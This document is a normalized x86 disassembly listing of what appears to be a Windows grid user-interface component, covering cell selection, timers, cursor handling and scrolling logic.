lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_45d73c
mov al [ ebx + 0x28e ]
dec al
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebx + 0x210 ]
jne r-xdata
sub al 0x3
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_45e32c
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x214 ]
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push 0x1
lea ecx [ ebp - 0x78 ]
mov edx edi
mov eax esi
call sub_41245c
lea eax [ ebp - 0x78 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_45fc44
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
lea ecx [ ebp - 0x78 ]
mov edx edi
mov eax esi
call sub_41245c
lea eax [ ebp - 0x78 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_45fc44
jmp r-xdata
jmp r-xdata
sub_45f950
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov esi [ edx + 0x260 ]
dec esi
sub esi eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x264 ]
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc esi
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ ebp - 0x4 ] eax
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
sub_45f9a8
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
xor edx edx
push ebp
push sub_45fc33
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x28e ]
dec al
je r-xdata
push edi
mov ecx ebx
mov dl [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd4
call sub_403324
push 0x1
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call KillTimer
mov eax [ ebp - 0x4 ]
call sub_4603e8
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403324
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
push ebx
push edi
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_4364d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fc3a
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x0
retn
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_45cd48
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_45d73c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x3
jne r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403324
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45d87c
push 0x1
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call KillTimer
lea ecx [ ebp - 0x70 ]
mov edx edi
mov eax ebx
call sub_41245c
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
mov si 0xff9e
call sub_403324
test al al
je r-xdata
dec al
je r-xdata
push ebp
lea eax [ ebp - 0x38 ]
call sub_45f950
pop ecx
cmp eax 0x1
jle r-xdata
push ebp
lea eax [ ebp - 0x68 ]
call sub_45f950
pop ecx
cmp eax 0x1
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_4345b8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x264 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x264 ] eax
mov eax [ ebp - 0x4 ]
call sub_4603e8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x270 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45d87c
push 0x1
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call KillTimer
lea ecx [ ebp - 0x70 ]
mov edx edi
mov eax ebx
call sub_41245c
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
mov si 0xff9f
call sub_403324
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x260 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
call sub_46024c
mov eax [ ebp - 0x4 ]
call sub_460b9c
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x260 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
call sub_45fedc
mov eax [ ebp - 0x4 ]
call sub_460b9c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
call sub_45bfe0
mov eax [ ebp - 0x4 ]
call sub_460b9c
mov eax [ ebp - 0x4 ]
call sub_4603e8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x270 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4603e8
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
call sub_45bf08
mov eax [ ebp - 0x4 ]
call sub_460b9c
sub_45fc44
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x10 ]
mov eax ebx
mov si 0xffc8
call sub_403324
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x270 ]
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
mov eax [ edi + 0x18 ]
cmp eax [ ebx + 0x270 ]
jne r-xdata
mov eax ebx
call sub_4345b8
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x20 ]
dec eax
cmp eax [ ebx + 0x270 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov eax ebx
call sub_45d87c
mov eax [ edi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax [ edi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jl r-xdata
mov eax [ edi + 0x14 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov eax [ edi + 0x18 ]
cmp eax [ ebx + 0x270 ]
jge r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov edx [ edi + 0x10 ]
mov eax [ ebx + 0x270 ]
cmp edx eax
jne r-xdata
mov eax [ edi + 0x1c ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_45e110
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov edx [ ebp + 0x14 ]
mov eax ebx
call sub_45cd48
cmp [ ebx + 0x28e ] 0x5
jne r-xdata
mov eax [ ebx + 0x270 ]
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x10 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx [ edi + 0x20 ]
dec edx
cmp eax edx
jge r-xdata
cmp [ ebx + 0x28e ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebx + 0x26c ]
mov eax ebx
mov si 0xffa1
call sub_403324
test al al
jne r-xdata
push 0x0
push 0x0
mov ecx 0x1
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_45e110
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov edx [ ebp + 0x14 ]
mov eax ebx
call sub_45cd48
mov eax ebx
call sub_45d87c
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebx + 0x26c ]
mov eax ebx
mov si 0xffa0
call sub_403324
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x270 ] eax
sub_45fe80
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x21c ]
je r-xdata
pop esi
pop ebx
retn
cmp esi 0x1
jge r-xdata
cmp esi [ ebx + 0x238 ]
jg r-xdata
mov esi 0x1
mov ecx [ ebx + 0x24c ]
mov edx esi
mov eax ebx
call sub_45d59c
test [ ebx + 0x249 ] 0x10
je r-xdata
mov edx esi
dec edx
mov eax ebx
call sub_460014
mov eax [ ebx + 0x21c ]
dec eax
mov [ ebx + 0x210 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_45fedc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45ff7a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
cmp esi [ ebx + 0x21c ]
jl r-xdata
lea eax [ ebx + 0x220 ]
mov ecx [ ebx + 0x230 ]
mov edx [ ebx + 0x21c ]
call sub_45acb4
mov eax [ ebx + 0x220 ]
mov eax [ eax + esi * 4 + 0x4 ]
cmp edi eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405978
mov eax [ ebp - 0x4 ]
call sub_45a8b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ff81
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
push edi
mov ecx eax
mov edx esi
mov eax ebx
call sub_45e560
mov eax [ ebx + 0x220 ]
mov [ eax + esi * 4 + 0x4 ] edi
mov eax ebx
mov si 0xffa5
call sub_403324
sub_45ff88
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
mov [ ebx + 0x230 ] esi
mov eax ebx
mov si 0xffa5
call sub_403324
mov eax ebx
call sub_45dce4
pop esi
pop ebx
retn
lea eax [ ebx + 0x220 ]
xor ecx ecx
xor edx edx
call sub_45acb4
sub_45ffc4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x250 ] 0x0
je r-xdata
mov [ ebx + 0x234 ] esi
mov eax ebx
mov si 0xffa4
call sub_403324
mov eax ebx
call sub_45dce4
pop esi
pop ebx
retn
lea eax [ ebx + 0x250 ]
xor ecx ecx
xor edx edx
call sub_45acb4
sub_460014
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46009c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebx + 0x238 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4600a3
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e9c
retn
test esi esi
jge r-xdata
cmp esi [ ebx + 0x21c ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405978
mov eax [ ebp - 0x4 ]
call sub_45a8b8
mov [ ebx + 0x238 ] esi
mov eax ebx
call sub_45dc60
mov eax ebx
call sub_45dce4
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405978
mov eax [ ebp - 0x8 ]
call sub_45a8b8
sub_4600ac
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_40387c#9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebx + 0x23c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46013b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e9c
retn
test esi esi
jge r-xdata
cmp esi [ ebx + 0x24c ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405978
mov eax [ ebp - 0x4 ]
call sub_45a8b8
mov [ ebx + 0x23c ] esi
mov eax ebx
call sub_45dc60
mov eax ebx
call sub_45dce4
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405978
mov eax [ ebp - 0x8 ]
call sub_45a8b8
sub_460144
push ebx
mov ebx eax
test dl dl
jne r-xdata
mov eax ebx
call sub_45bc94
mov eax [ ebx + 0x27c ]
test eax eax
je r-xdata
mov eax ebx
call sub_45bc84
pop ebx
retn
pop ebx
retn
call sub_45b41c
sub_460180
push ebx
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x248 ]
je r-xdata
pop edx
pop ebx
retn
test [ esp + 0x1 ] 0x10
je r-xdata
mov ax [ esp ]
mov [ ebx + 0x248 ] ax
cmp [ ebx + 0x28d ] 0x0
jne r-xdata
and [ esp ] 0xdfff
test [ esp + 0x1 ] 0x10
je r-xdata
test [ esp + 0x1 ] 0x20
je r-xdata
mov eax ebx
call sub_45dce4
push 0x1
push 0x0
mov ecx [ ebx + 0x22c ]
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_45e3b4
mov eax ebx
call sub_45bc84
mov eax ebx
call sub_45bc94
jmp r-xdata
sub_460210
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x24c ]
je r-xdata
pop esi
pop ebx
retn
cmp esi 0x1
jge r-xdata
cmp esi [ ebx + 0x23c ]
jg r-xdata
mov esi 0x1
mov ecx esi
mov edx [ ebx + 0x21c ]
mov eax ebx
call sub_45d59c
mov edx esi
dec edx
mov eax ebx
call sub_4600ac
sub_46024c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_40387c#8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x250 ] 0x0
jne r-xdata
cmp esi [ ebx + 0x24c ]
jl r-xdata
lea eax [ ebx + 0x250 ]
mov ecx [ ebx + 0x234 ]
mov edx [ ebx + 0x24c ]
call sub_45acb4
mov eax [ ebx + 0x250 ]
mov eax [ eax + esi * 4 + 0x4 ]
cmp edi eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405978
mov eax [ ebp - 0x4 ]
call sub_45a8b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4602f1
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
push edi
mov ecx eax
mov edx esi
mov eax ebx
call sub_45e56c
mov eax [ ebx + 0x250 ]
mov [ eax + esi * 4 + 0x4 ] edi
mov eax ebx
mov si 0xffa4
call sub_403324
sub_46030c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x27c ] 0x0
je r-xdata
pop ecx
pop ebp
retn
xor eax eax
push ebp
push j_sub_40387c#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4604c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x280 ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov [ eax + 0x284 ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
call sub_45b4c0
retn
sub_460378
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov eax [ ebx ]
mov eax [ eax + 0x228 ]
mov edx [ ebx ]
mov [ edx + 0x280 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x22c ]
mov edx [ ebx ]
mov [ edx + 0x284 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x27c ]
mov edx [ eax ]
call [ edx + 0x100 ]
mov eax [ ebx ]
mov eax [ eax + 0x27c ]
call sub_457d74
inc eax
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x219 ] 0x1
mov eax [ ebx ]
mov [ eax + 0x219 ] 0x0
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x27c ]
call sub_42e154
pop ebx
pop ebp
retn
sub_4603e8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd4 ]
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x27c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x280 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd0 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x27c ] ebx
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_45add4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
push ebp
call sub_460378
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46030c
push ebp
call sub_460378
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x284 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd4 ]
test al al
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x22c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x228 ]
mov eax [ ebp - 0x4 ]
call sub_45bb74
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
call sub_45b638
sub_4604c8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_46052e
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x280 ]
cmp esi 0xffffffff
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460535
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
cmp [ ebx + 0x284 ] 0xffffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x27c ]
call sub_457920
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebx + 0x284 ]
mov edx esi
mov eax ebx
mov si 0xffae
call sub_403324
sub_46053c
test [ eax + 0x249 ] 0x4
je r-xdata
call sub_43a3f8
retn
mov cl [ edx + 0x4 ]
sub cl 0x8
je r-xdata
mov dl [ edx + 0x4 ]
call sub_45bca4
retn
add cl 0xe8
sub cl 0xe0
jae r-xdata
sub_460564
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x27c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_43b390
cmp eax [ edi + 0x8 ]
jne r-xdata
mov ax [ edi + 0x6 ]
sub ax 0x300
jne r-xdata
mov eax ebx
call sub_4604c8
sub_4605c8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_439ad8
mov edx esp
mov eax ebx
call sub_45fdfc
mov edx esp
mov eax ebx
call sub_45dcec
mov edi [ ebx + 0x27c ]
test edi edi
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_43b390
cmp eax [ esi + 0x4 ]
je r-xdata
mov eax ebx
call sub_46030c
sub_46063c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
lea edx [ esp + 0x8 ]
mov eax [ esi + 0x8 ]
call sub_406878
lea edx [ esp + 0x8 ]
mov ecx esp
mov eax ebx
call sub_4346f8
mov eax [ esp ]
mov [ ebx + 0x274 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x278 ] eax
add esp 0x10
pop esi
pop ebx
retn
sub_460680
push ebx
push esi
push edi
push ebp
add esp 0xffffff90
mov edi edx
mov esi eax
xor ebx ebx
cmp [ edi + 0x8 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov al [ esi + 0x28e ]
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_4399c4
push ebx
call SetCursor
jmp r-xdata
mov [ esp ] al
lea edx [ esp + 0x10 ]
mov eax esi
call sub_45cd48
push esp
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov ecx [ esi + 0x278 ]
mov edx [ esi + 0x274 ]
mov eax esi
mov ebp [ eax ]
call [ ebp + 0xcc ]
jmp r-xdata
add esp 0x70
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esp ] 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx 0xfffffff1
call sub_453500
mov ebx eax
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx 0xfffffff2
call sub_453500
mov ebx eax
sub_46072c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_439ac4
mov edi [ ebx + 0x27c ]
test edi edi
je r-xdata
mov edx esp
mov eax ebx
call sub_45fdfc
mov edx esp
mov eax ebx
call sub_45dcec
mov eax ebx
call sub_4603e8
mov eax edi
call sub_43b390
cmp eax [ esi + 0x4 ]
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_460778
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_43997c
mov eax ebx
call sub_45ecf4
mov eax ebx
mov si 0xffc8
call sub_403324
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4607d0
push ebp
mov ebp esp
add esp 0xffffff98
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_40387c#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x28e ]
dec al
je r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call KillTimer
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460860
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x0
retn
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_45cd48
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_45d73c
jmp r-xdata
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
call sub_45d87c
push 0x1
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call KillTimer
jmp r-xdata
sub_460878
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x27c ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_4607d0
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x74 ]
sub_4608a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x27c ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_43a8ec
pop esi
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_434ca8
sub_4608dc
push ebx
push esi
mov ebx edx
mov esi eax
movsx ecx [ ebx + 0xa ]
movsx edx [ ebx + 0x8 ]
mov eax esi
call sub_45c070
neg al
sbb eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_4608fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x249 ] 0x4
je r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0xd
jne r-xdata
mov [ esi + 0xc ] 0x1
sub_460924
add esp 0xffffffec
mov [ esp ] dl
mov edx [ eax + 0x210 ]
mov [ esp + 0xc ] edx
mov edx [ eax + 0x214 ]
mov [ esp + 0x10 ] edx
mov edx [ eax + 0x21c ]
dec edx
mov [ esp + 0x4 ] edx
mov edx [ eax + 0x24c ]
dec edx
mov [ esp + 0x8 ] edx
test [ esp ] 0x1
je r-xdata
test [ esp ] 0x2
je r-xdata
mov edx [ eax + 0x210 ]
cmp edx [ eax + 0x238 ]
jle r-xdata
test [ esp ] 0x4
je r-xdata
mov edx [ eax + 0x210 ]
cmp edx [ esp + 0x4 ]
jge r-xdata
dec [ esp + 0xc ]
test [ esp ] 0x8
je r-xdata
mov edx [ eax + 0x214 ]
cmp edx [ eax + 0x23c ]
jle r-xdata
inc [ esp + 0xc ]
mov edx [ eax + 0x210 ]
cmp edx [ esp + 0xc ]
jne r-xdata
mov edx [ eax + 0x214 ]
cmp edx [ esp + 0x8 ]
jge r-xdata
dec [ esp + 0x10 ]
lea edx [ esp + 0xc ]
call sub_45e32c
mov edx [ eax + 0x214 ]
cmp edx [ esp + 0x10 ]
je r-xdata
inc [ esp + 0x10 ]
add esp 0x14
retn
sub_4609d8
push ebx
push esi
push edi
add esp 0xffffff88
mov edi eax
mov al [ edi + 0x28e ]
sub al 0x1
je r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x70 ]
mov edx esp
mov eax edi
call sub_4346f8
mov eax [ esp + 0x70 ]
mov [ esp ] eax
mov eax [ esp + 0x74 ]
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov eax edi
call sub_45cd48
mov bl [ r-xdata ]
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax edi
call sub_45ccec
mov al [ edi + 0x28e ]
dec al
je r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax edi
mov si 0xffc8
call sub_403324
test al al
jne r-xdata
sub al 0x3
je r-xdata
add esp 0x78
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4345b8
mov esi eax
sub esi [ esp + 0x24 ]
mov eax edi
call sub_4345b8
sub eax [ esp + 0x14 ]
mov edx [ esp ]
cmp esi edx
jle r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x14 ]
jge r-xdata
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x44 ]
push eax
push 0x1
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x14 ]
mov eax edi
call sub_45fc44
jmp r-xdata
dec al
jne r-xdata
cmp eax edx
jge r-xdata
or bl 0x2
jmp r-xdata
cmp eax [ esp + 0x24 ]
jle r-xdata
or bl 0x1
jmp r-xdata
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x14 ]
push eax
push 0x0
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x10 ]
mov eax edi
call sub_45fc44
jmp r-xdata
mov eax [ esp + 0x4 ]
cmp eax [ esp + 0x44 ]
jge r-xdata
or bl 0x1
or bl 0x2
jmp r-xdata
cmp eax [ esp + 0x54 ]
jle r-xdata
or bl 0x4
jmp r-xdata
mov al [ r-xdata ]
cmp al bl
je r-xdata
or bl 0x8
mov edx ebx
mov eax edi
mov si 0xffa6
call sub_403324
sub_460b9c
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
pop ebx
retn
mov eax ebx
call sub_43b694
test al al
je r-xdata
test [ ebx + 0x1c ] 0x40
jne r-xdata
mov eax ebx
call sub_44c6fc
test eax eax
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_460bd8
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov ebx eax
lea ecx [ esp + 0x1 ]
mov dl [ esp ]
mov eax ebx
call sub_4355cc
test al al
jne r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x24c ]
dec edx
mov eax [ ebx + 0x22c ]
cmp edx eax
jle r-xdata
mov al 0x1
mov edx eax
inc edx
mov eax ebx
call sub_4601f8
sub_460c24
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
